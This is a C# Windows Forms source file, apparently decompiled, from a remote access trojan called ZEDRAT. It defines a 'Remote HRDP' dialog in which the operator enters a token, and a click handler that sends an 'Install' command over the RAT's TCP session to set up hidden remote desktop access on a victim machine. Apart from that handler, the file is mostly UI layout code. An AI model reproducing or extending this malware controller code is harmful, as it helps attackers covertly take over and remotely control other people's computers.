using System;
using System.ComponentModel;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using Bunifu.UI.WinForms;
using Bunifu.UI.WinForms.BunifuButton;
using Guna.UI2.WinForms;
using Siticone.Desktop.UI.WinForms;

using Sockets;
using ZEDRAT.TCP;
using TextBox = Siticone.Desktop.UI.WinForms.SiticoneTextBox;

namespace ZEDRatApp.Forms
{
	public class Remote_HRDP : Form
	{
		private readonly string strHostIPAddress;

		private bool bUseDownload;

		private TcpClientSession _tcs;

		private IContainer components;

		private BunifuSeparator bunifuSeparator1;

		private SiticoneControlBox siticoneControlBox1;

		private SiticoneHtmlLabel SiticoneHtmlLabel12;

		private Label label1;

		private SiticoneTextBox txtToken;

		private SiticoneRoundedButton btnTokenExec;

		private BunifuIconButton CloseBtn;

		private Guna2ShadowForm guna2ShadowForm1;

		public Remote_HRDP(string strHostIPAddress, TcpClientSession tcs)
		{
			this.InitializeComponent();
			this.strHostIPAddress = strHostIPAddress;
			this._tcs = tcs;
		}

		private void btnTokenExec_Click(object sender, EventArgs e)
		{
			string text = (this.txtToken).Text;
			if (string.IsNullOrEmpty(text))
			{
				throw new Exception();
			}
			this._tcs.Client_Send(DataType.RemoteHydraHRDPType, Encoding.UTF8.GetBytes("Install" + text));
			base.DialogResult = DialogResult.OK;
			base.Close();
			base.Close();
		}

		private void siticoneControlBox1_Click(object sender, EventArgs e)
		{
			base.Close();
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
																											this.components = new System.ComponentModel.Container();
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(ZEDRatApp.Forms.Remote_HRDP));
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			this.bunifuSeparator1 = new Bunifu.UI.WinForms.BunifuSeparator();
			this.siticoneControlBox1 = new SiticoneControlBox();
			this.SiticoneHtmlLabel12 = new SiticoneHtmlLabel();
			this.label1 = new System.Windows.Forms.Label();
			this.txtToken = new SiticoneTextBox();
			this.btnTokenExec = new SiticoneRoundedButton();
			this.CloseBtn = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.guna2ShadowForm1 = new Guna.UI2.WinForms.Guna2ShadowForm(this.components);
			base.SuspendLayout();
			this.bunifuSeparator1.BackColor = System.Drawing.Color.Transparent;
			this.bunifuSeparator1.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuSeparator1.BackgroundImage");
			this.bunifuSeparator1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.bunifuSeparator1.DashCap = Bunifu.UI.WinForms.BunifuSeparator.CapStyles.Flat;
			this.bunifuSeparator1.LineColor = System.Drawing.Color.DimGray;
			this.bunifuSeparator1.LineStyle = Bunifu.UI.WinForms.BunifuSeparator.LineStyles.DoubleEdgeFaded;
			this.bunifuSeparator1.LineThickness = 1;
			this.bunifuSeparator1.Location = new System.Drawing.Point(-2, 55);
			this.bunifuSeparator1.Margin = new System.Windows.Forms.Padding(6, 2, 6, 2);
			this.bunifuSeparator1.Name = "bunifuSeparator1";
			this.bunifuSeparator1.Orientation = Bunifu.UI.WinForms.BunifuSeparator.LineOrientation.Horizontal;
			this.bunifuSeparator1.Size = new System.Drawing.Size(837, 9);
			this.bunifuSeparator1.TabIndex = 85;
			((System.Windows.Forms.Control)(object)this.siticoneControlBox1).Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			((System.Windows.Forms.Control)(object)this.siticoneControlBox1).BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.siticoneControlBox1.BorderColor = System.Drawing.Color.DarkGray;
			this.siticoneControlBox1.BorderRadius = 12;
			this.siticoneControlBox1.FillColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.siticoneControlBox1.IconColor = System.Drawing.Color.Black;
			((System.Windows.Forms.Control)(object)this.siticoneControlBox1).Location = new System.Drawing.Point(685, 12);
			((System.Windows.Forms.Control)(object)this.siticoneControlBox1).Name = "siticoneControlBox1";
			this.siticoneControlBox1.PressedColor = System.Drawing.Color.Red;
			this.siticoneControlBox1.ShadowDecoration.Parent = (System.Windows.Forms.Control)(object)this.siticoneControlBox1;
			((System.Windows.Forms.Control)(object)this.siticoneControlBox1).Size = new System.Drawing.Size(45, 29);
			((System.Windows.Forms.Control)(object)this.siticoneControlBox1).TabIndex = 84;
			((System.Windows.Forms.Control)(object)this.siticoneControlBox1).Click += new System.EventHandler(siticoneControlBox1_Click);
			((System.Windows.Forms.Control)(object)this.SiticoneHtmlLabel12).Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			((System.Windows.Forms.Control)(object)this.SiticoneHtmlLabel12).BackColor = System.Drawing.Color.Transparent;
			this.SiticoneHtmlLabel12.Font = new System.Drawing.Font("Century Gothic", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.SiticoneHtmlLabel12.ForeColor = System.Drawing.Color.LightGray;
			((System.Windows.Forms.Control)(object)this.SiticoneHtmlLabel12).Location = new System.Drawing.Point(289, 21);
			((System.Windows.Forms.Control)(object)this.SiticoneHtmlLabel12).Name = "SiticoneHtmlLabel12";
			((System.Windows.Forms.Control)(object)this.SiticoneHtmlLabel12).Size = new System.Drawing.Size(111, 23);
			((System.Windows.Forms.Control)(object)this.SiticoneHtmlLabel12).TabIndex = 83;
			((System.Windows.Forms.Control)(object)this.SiticoneHtmlLabel12).Text = "Remote HRDP";
			this.label1.AutoSize = true;
			this.label1.ForeColor = System.Drawing.Color.White;
			this.label1.Location = new System.Drawing.Point(63, 125);
			this.label1.Name = "label1";
			this.label1.Size = new System.Drawing.Size(41, 13);
			this.label1.TabIndex = 87;
			this.label1.Text = "Token:";
			(this.txtToken).BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			((System.Windows.Forms.Control)(object)this.txtToken).Cursor = System.Windows.Forms.Cursors.IBeam;
			(this.txtToken).DefaultText = "";
			(this.txtToken).DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
			(this.txtToken).DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
			(this.txtToken).DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			(this.txtToken).DisabledState.Parent = this.txtToken;
			(this.txtToken).DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			(this.txtToken).FillColor = System.Drawing.Color.FromArgb(18, 15, 24);
			(this.txtToken).FocusedState.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			(this.txtToken).FocusedState.Parent = this.txtToken;
			((System.Windows.Forms.Control)(object)this.txtToken).Location = new System.Drawing.Point(121, 112);
			((System.Windows.Forms.Control)(object)this.txtToken).Name = "txtToken";
			(this.txtToken).PasswordChar = '\0';
			(this.txtToken).PlaceholderText = "";
			(this.txtToken).SelectedText = "";
			(this.txtToken).ShadowDecoration.Parent = (System.Windows.Forms.Control)(object)this.txtToken;
			((System.Windows.Forms.Control)(object)this.txtToken).Size = new System.Drawing.Size(422, 26);
			((System.Windows.Forms.Control)(object)this.txtToken).TabIndex = 89;
			(this.btnTokenExec).BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			(this.btnTokenExec).BorderThickness = 1;
			(this.btnTokenExec).CheckedState.Parent = this.btnTokenExec;
			(this.btnTokenExec).CustomBorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			(this.btnTokenExec).CustomImages.Parent = this.btnTokenExec;
			(this.btnTokenExec).FillColor = System.Drawing.Color.FromArgb(9, 8, 13);
			((System.Windows.Forms.Control)(object)this.btnTokenExec).Font = new System.Drawing.Font("Century Gothic", 9f);
			((System.Windows.Forms.Control)(object)this.btnTokenExec).ForeColor = System.Drawing.Color.White;
			((System.Windows.Forms.Control)(object)this.btnTokenExec).Location = new System.Drawing.Point(567, 112);
			((System.Windows.Forms.Control)(object)this.btnTokenExec).Name = "btnTokenExec";
			(this.btnTokenExec).ShadowDecoration.Parent = (System.Windows.Forms.Control)(object)this.btnTokenExec;
			((System.Windows.Forms.Control)(object)this.btnTokenExec).Size = new System.Drawing.Size(97, 28);
			((System.Windows.Forms.Control)(object)this.btnTokenExec).TabIndex = 88;
			((System.Windows.Forms.Control)(object)this.btnTokenExec).Text = "Execute";
			((System.Windows.Forms.Control)(object)this.btnTokenExec).Click += new System.EventHandler(btnTokenExec_Click);
			this.CloseBtn.AllowAnimations = true;
			this.CloseBtn.AllowBorderColorChanges = true;
			this.CloseBtn.AllowMouseEffects = true;
			this.CloseBtn.Anchor = System.Windows.Forms.AnchorStyles.None;
			this.CloseBtn.AnimationSpeed = 200;
			this.CloseBtn.BackColor = System.Drawing.Color.Transparent;
			this.CloseBtn.BackgroundColor = System.Drawing.Color.Transparent;
			this.CloseBtn.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.CloseBtn.BorderRadius = 1;
			this.CloseBtn.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.CloseBtn.BorderThickness = 1;
			this.CloseBtn.ColorContrastOnClick = 30;
			this.CloseBtn.ColorContrastOnHover = 30;
			this.CloseBtn.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges.BottomLeft = true;
			borderEdges.BottomRight = true;
			borderEdges.TopLeft = true;
			borderEdges.TopRight = true;
			this.CloseBtn.CustomizableEdges = borderEdges;
			this.CloseBtn.DialogResult = System.Windows.Forms.DialogResult.None;
			this.CloseBtn.Image = (System.Drawing.Image)resources.GetObject("CloseBtn.Image");
			this.CloseBtn.ImageMargin = new System.Windows.Forms.Padding(0);
			this.CloseBtn.Location = new System.Drawing.Point(12, 12);
			this.CloseBtn.Name = "CloseBtn";
			this.CloseBtn.RoundBorders = false;
			this.CloseBtn.ShowBorders = true;
			this.CloseBtn.Size = new System.Drawing.Size(35, 35);
			this.CloseBtn.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.CloseBtn.TabIndex = 169;
			this.guna2ShadowForm1.ShadowColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.guna2ShadowForm1.TargetForm = this;
			base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			this.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			base.ClientSize = new System.Drawing.Size(742, 219);
			base.Controls.Add(this.CloseBtn);
			base.Controls.Add(this.label1);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.txtToken);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.btnTokenExec);
			base.Controls.Add(this.bunifuSeparator1);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.siticoneControlBox1);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.SiticoneHtmlLabel12);
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
			base.Name = "Remote_HRDP";
			this.Text = "Remote_HRDP";
			base.ResumeLayout(false);
			base.PerformLayout();
		}
	}
}
